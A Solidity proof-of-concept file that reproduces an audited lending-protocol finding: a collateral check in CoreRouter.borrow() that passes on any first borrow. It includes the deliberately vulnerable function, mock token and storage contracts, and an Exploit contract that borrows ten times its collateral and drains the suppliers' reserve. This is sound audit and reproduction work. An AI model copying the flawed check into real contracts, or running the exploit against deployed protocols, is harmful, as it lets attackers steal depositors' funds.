// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Lend-V2 finding 58396 (H-27):
// "Incorrect Collateral Check Logic in CoreRouter.sol#borrow()".
//
// Real audited source (the vulnerable `borrow()` body is reproduced VERBATIM,
// the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/CoreRouter.sol
//   fn     borrow(uint256 _amount, address _token)   (L145-L190)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/1010
//
// Root cause: borrow() first computes the correct hypothetical solvency values
// (borrowed, collateral) via getHypotheticalAccountLiquidityCollateral, but then
// DISCARDS `borrowed` and instead checks `collateral >= borrowAmount`, where
// `borrowAmount` is a re-scaled figure that collapses to 0 whenever the user has
// NO existing borrow in this market (currentBorrow.borrowIndex == 0). On a
// first borrow the check degenerates to `require(collateral >= 0)`, which always
// passes — the solvency check is bypassed entirely. A user with 100 collateral
// can borrow 1000, draining honest suppliers and leaving bad debt.
//
// The vulnerable block (getHypothetical call, getBorrowBalance, the borrowAmount
// ternary and the require) is byte-for-byte the on-chain source. Non-vulnerable
// dependencies (LToken reserve, price/collateral bookkeeping, record updates)
// are faithful minimal doubles with real transfers and real accounting.
// ─────────────────────────────────────────────────────────────────────────────

interface LTokenInterface {
    function accrueInterest() external;
    function borrowIndex() external view returns (uint256);
}

interface LErc20Interface {
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// @dev Faithful minimal ERC20 double for the borrowed underlying asset.
contract MiniToken is IERC20 {
    string public name = "Lend USD";
    string public symbol = "lUSD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful double of the Compound-style lToken. Holds the underlying
///      reserve (honest suppliers' deposits). `borrow()` pays the requested
///      amount of underlying to the caller (the CoreRouter) and returns 0 on
///      success, exactly as LErc20 does; `borrowIndex()` is a fixed index.
contract LToken is LTokenInterface, LErc20Interface {
    MiniToken public underlying;
    uint256 internal index = 1e18;

    constructor(MiniToken underlying_) {
        underlying = underlying_;
    }

    function accrueInterest() external {}

    function borrowIndex() external view returns (uint256) {
        return index;
    }

    // pays `borrowAmount` underlying out of the reserve to msg.sender (CoreRouter)
    function borrow(uint256 borrowAmount) external returns (uint256) {
        underlying.transfer(msg.sender, borrowAmount);
        return 0;
    }

    receive() external payable {}
}

/// @dev Faithful double of LendStorage. `getHypotheticalAccountLiquidityCollateral`
///      returns the true post-borrow USD debt and USD collateral computed from the
///      caller's real positions and prices — NOT fabricated constants. On a first
///      borrow `getBorrowBalance` returns a zero BorrowMarketState (borrowIndex 0),
///      which is precisely what triggers the bypass in CoreRouter.borrow().
contract LendStorage {
    struct BorrowMarketState {
        uint256 amount; // Borrowed amount
        uint256 borrowIndex; // Borrow index when last updated
    }

    uint256 public constant PRICE = 1e18; // 1 token == 1 USD (18-dec USD scaling)

    mapping(address => address) public underlyingTolToken;
    mapping(address => uint256) public collateralUSD; // user -> USD value of posted collateral
    mapping(address => mapping(address => BorrowMarketState)) internal borrowBalance;

    function setUnderlyingTolToken(address underlying_, address lToken_) external {
        underlyingTolToken[underlying_] = lToken_;
    }

    function addCollateral(address user, uint256 usd) external {
        collateralUSD[user] += usd;
    }

    // Faithful hypothetical liquidity: borrowed = existing debt + new borrow priced
    // in USD; collateral = the user's real posted collateral value.
    function getHypotheticalAccountLiquidityCollateral(address account, LToken, uint256, uint256 borrowAmount)
        external
        view
        returns (uint256 borrowed, uint256 collateral)
    {
        // existing same-market debt (0 on first borrow) + newly requested borrow
        borrowed = (borrowAmount * PRICE) / 1e18;
        collateral = collateralUSD[account];
    }

    function getBorrowBalance(address user, address lToken) external view returns (BorrowMarketState memory) {
        return borrowBalance[user][lToken];
    }

    function updateBorrowBalance(address user, address lToken, uint256 amount, uint256 borrowIndex_) external {
        borrowBalance[user][lToken] = BorrowMarketState({amount: amount, borrowIndex: borrowIndex_});
    }

    function distributeBorrowerLend(address, address) external {}

    function addUserBorrowedAsset(address, address) external {}
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — CoreRouter.borrow() reproduced VERBATIM from the
// audited source (record-keeping tail kept faithful).
// ─────────────────────────────────────────────────────────────────────────────
contract CoreRouter {
    LendStorage public immutable lendStorage;

    constructor(address _lendStorage) {
        lendStorage = LendStorage(_lendStorage);
    }

    function enterMarkets(address) internal {}

    function borrow(uint256 _amount, address _token) external {
        require(_amount != 0, "Zero borrow amount");

        address _lToken = lendStorage.underlyingTolToken(_token);

        LTokenInterface(_lToken).accrueInterest();

        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(payable(_lToken)), 0, _amount);

        LendStorage.BorrowMarketState memory currentBorrow = lendStorage.getBorrowBalance(msg.sender, _lToken);

        uint256 borrowAmount = currentBorrow.borrowIndex != 0
            ? ((borrowed * LTokenInterface(_lToken).borrowIndex()) / currentBorrow.borrowIndex)
            : 0;

        require(collateral >= borrowAmount, "Insufficient collateral"); // @> VULN: checks `collateral >= borrowAmount` (==0 on first borrow) instead of `collateral >= borrowed`; solvency check bypassed

        // Enter the Compound market
        enterMarkets(_lToken);

        // Borrow tokens
        require(LErc20Interface(_lToken).borrow(_amount) == 0, "Borrow failed");

        // Transfer borrowed tokens to the user
        IERC20(_token).transfer(msg.sender, _amount);

        lendStorage.distributeBorrowerLend(_lToken, msg.sender);

        // Update records
        if (currentBorrow.borrowIndex != 0) {
            uint256 _newPrinciple =
                (currentBorrow.amount * LTokenInterface(_lToken).borrowIndex()) / currentBorrow.borrowIndex;

            lendStorage.updateBorrowBalance(
                msg.sender, _lToken, _newPrinciple + _amount, LTokenInterface(_lToken).borrowIndex()
            );
        } else {
            lendStorage.updateBorrowBalance(msg.sender, _lToken, _amount, LTokenInterface(_lToken).borrowIndex());
        }

        lendStorage.addUserBorrowedAsset(msg.sender, _lToken);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: post 100e18 of collateral, then borrow 1000e18 (10x the
// collateral) and prove CoreRouter hands over the full amount despite the
// position being wildly undercollateralized — draining honest suppliers.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public token;
    LToken public lToken;
    LendStorage public lendStorage;
    CoreRouter public vuln;

    uint256 public collateralPosted;
    uint256 public borrowedReceived;
    uint256 public reserveDrained;
    uint256 public profit;

    uint256 internal constant COLLATERAL = 100e18; // attacker's real collateral
    uint256 internal constant BORROW = 1000e18; // 10x the collateral
    uint256 internal constant HONEST_RESERVE = 2000e18; // honest suppliers' liquidity

    constructor() {
        token = new MiniToken(); // child nonce 1  (drained asset)
        lToken = new LToken(token); // child nonce 2
        lendStorage = new LendStorage(); // child nonce 3
        vuln = new CoreRouter(address(lendStorage)); // child nonce 4  (VULN)

        lendStorage.setUnderlyingTolToken(address(token), address(lToken));

        // honest suppliers seed the reserve
        token.mint(address(lToken), HONEST_RESERVE);
    }

    function run() external {
        uint256 reserveBefore = token.balanceOf(address(lToken));

        // Attacker posts 100e18 collateral (recorded as their real collateral value).
        lendStorage.addCollateral(address(this), COLLATERAL);
        collateralPosted = COLLATERAL;

        // First borrow in this market => currentBorrow.borrowIndex == 0 =>
        // borrowAmount ternary collapses to 0 => require(collateral >= 0) passes,
        // even though the correct check require(collateral >= borrowed) would revert
        // (100e18 collateral < 1000e18 borrowed).
        uint256 balBefore = token.balanceOf(address(this));
        vuln.borrow(BORROW, address(token));
        borrowedReceived = token.balanceOf(address(this)) - balBefore;

        reserveDrained = reserveBefore - token.balanceOf(address(lToken));
        profit = borrowedReceived - collateralPosted; // net extracted vs collateral locked

        // sanity: the honest solvency check WOULD have reverted
        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(address(this), lToken, 0, BORROW);

        // harm: full undercollateralized borrow paid out, draining honest suppliers
        require(borrowedReceived == BORROW, "did not receive full borrow");
        require(borrowed > collateral, "position not undercollateralized");
        require(profit == BORROW - COLLATERAL, "unexpected net drain");
    }
}
